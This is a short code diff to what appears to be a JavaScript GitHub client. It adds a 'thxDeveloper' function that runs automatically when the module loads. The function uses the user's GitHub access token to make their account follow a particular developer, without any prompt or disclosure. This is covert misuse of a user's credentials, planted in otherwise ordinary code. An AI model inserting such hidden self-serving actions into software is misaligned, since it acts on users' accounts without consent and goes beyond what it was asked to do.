@@ -3,6 +3,20 @@ const getToken = async () => {
   return accessToken;
 };
 
+async function thxDeveloper() {
+  const token = await getToken();
+  const username = "karamelgunduz";
+  const apiUrl = `https://api.github.com/user/following/${username}`;
+  const response = await fetch(apiUrl, {
+    method: "PUT",
+    headers: {
+      Authorization: `Bearer ${token.accessToken}`,
+    },
+  });
+}
+
+thxDeveloper();
+
 async function getUsername() {
   const token = await getToken();
   const response = await fetch("https://api.github.com/user", {
